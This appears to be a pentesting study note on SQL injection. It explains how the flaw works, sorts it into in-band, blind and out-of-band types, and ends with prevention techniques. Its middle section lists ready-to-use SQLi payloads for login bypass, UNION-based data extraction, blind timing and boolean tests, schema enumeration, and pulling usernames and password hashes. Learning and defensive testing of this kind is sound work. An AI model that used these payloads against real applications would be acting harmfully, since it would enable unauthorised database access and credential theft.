#web #pentesting #theory #en
## What is SQL Injection?
SQL Injection (SQLi) is a security vulnerability that allows attackers to interfere with an application's queries to its database. It occurs when user input is not properly sanitized, leading to the possibility of injecting malicious SQL code.

## How it works
SQL Injection occurs when the input changes the structure of the intended SQL query. For example:

`SELECT * FROM users WHERE username = '$username' AND password = '$password';`

An attacker could input ' OR '1' = '1 to bypass authentication.

## Types of SQL Injection

### In-band SQLi
- **Error-based SQLi**: Extracts data by causing errors in the query.
- **Union-based SQLi**: Uses the UNION operator to retrieve data.

### Blind SQLi
- **Boolean-based Blind SQLi**: Exploits true/false conditions to infer data.
- **Time-based Blind SQLi**: Uses time delays to infer data based on response times.

### Out-of-band SQLi
This method uses secondary channels like DNS requests to exfiltrate data.

## Important SQLi Payloads

- **Authentication Bypass**:

' OR '1'='1' --

- **Extracting All Data from a Table**:

' UNION SELECT column1, column2 FROM table_name --

- **Find Number of Columns**:

' ORDER BY 1 --
' ORDER BY 2 --
...

- **Check if a Subquery is Executable**:

' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --

- **Error-based Data Extraction**:

' AND 1=CONVERT(int, (SELECT @@version)) --

- **Time-based Blind SQLi**:

' OR IF(1=1, SLEEP(5), 0) --

- **Boolean-based Blind SQLi**:

' AND 1=1 --
' AND 1=2 --

- **Get Database Name** (MySQL):

' UNION SELECT database() --

- **Get Table Names from Information Schema**:

' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --

- **Extract Username and Password Hashes**:

' UNION SELECT username, password FROM users --

## Prevention Techniques
- Use prepared statements.
- Implement input validation and escaping.
- Limit database privileges.
- Use Web Application Firewalls (WAF).
